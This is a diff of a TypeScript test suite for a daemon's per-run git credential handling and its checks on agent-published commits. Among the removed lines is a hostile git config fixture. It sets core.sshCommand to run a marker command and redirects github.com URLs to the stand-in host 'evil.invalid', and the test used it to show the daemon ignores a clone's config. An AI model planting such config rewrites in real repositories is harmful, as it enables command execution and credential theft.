@@ -108,6 +108,9 @@ it("gives the daemon's own clone and fetch the run's repository token, and nothi
   const fill = (env: Record<string, string>, path: string) => execa('git', ['credential', 'fill'], {
     env: { PATH: f.path, HOME: f.root, GIT_CONFIG_NOSYSTEM: '1', NO_PROXY: '127.0.0.1', no_proxy: '127.0.0.1', ...env }, extendEnv: false,
     input: `protocol=https\nhost=github.com\npath=${path}\n\n`, cwd: f.worktree, reject: false })
+  // The legacy path discovers native gh before making its Git helper.
+  // Exercise the fixture CLI even on a development machine without gh.
+  vi.stubEnv('PATH', f.path)
   try {
     await withRunGitCredentials(assignment, privateDir, async env => {
       expect(Object.keys(env).every(key => key.startsWith('GIT_CONFIG_') || key === 'GIT_TERMINAL_PROMPT')).toBe(true)
@@ -121,7 +124,10 @@ it("gives the daemon's own clone and fetch the run's repository token, and nothi
     expect(readdirSync(privateDir)).toEqual([])
     // Without GitHub delivery the machine's own git credentials apply, as before.
     expect(await withRunGitCredentials({ issueId: github.issueId }, privateDir, async env => env)).toEqual({})
-  } finally { await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve())) }
+  } finally {
+    vi.unstubAllEnvs()
+    await new Promise<void>((resolve, reject) => server.close(error => error ? reject(error) : resolve()))
+  }
 })
 
 it('supplies a private run-local helper to each real harness without modifying the repository', async () => {
@@ -222,14 +228,7 @@ it('accepts only an already committed and pushed HEAD with passing PR checks; it
   await expect(agentPublishedReceipt({ ...input, env: { ...env, TEST_PENDING: '1' } })).rejects.toThrow('successful CI')
   await expect(agentPublishedReceipt({ ...input, env: { ...env, TEST_HEAD: 'a'.repeat(40) } })).rejects.toThrow('successful CI')
   await expect(agentPublishedReceipt({ ...input, env: { ...env, TEST_CI_HEAD: 'b'.repeat(40) } })).rejects.toThrow('successful CI')
-  // Hosted CLI commits belong to its private clone. The daemon imports only
-  // the exact successful remote object, without reading that clone's config.
-  const base = git(f.worktree, 'rev-parse', 'HEAD~1')
-  git(f.worktree, 'update-ref', 'refs/heads/mikka/run-github-test', base, head)
-  git(f.worktree, 'read-tree', base)
-  const shadow = join(f.runDir, 'runtime-git', '.git')
-  mkdirSync(shadow, { recursive: true })
-  writeFileSync(join(shadow, 'config'), `[core]\n\tsshCommand = touch '${escaped}'\n[url "ssh://evil.invalid/"]\n\tinsteadOf = https://github.com/\n`)
+  // Hosted runs use their actual committed HEAD and ordinary gh binary.
   expect(await agentPublishedReceipt({ ...input, hosted: true })).toMatchObject({ commit: head, pushed: true })
   expect(git(f.worktree, 'rev-parse', 'HEAD')).toBe(head)
   expect(git(f.worktree, 'status', '--porcelain')).toBe('')
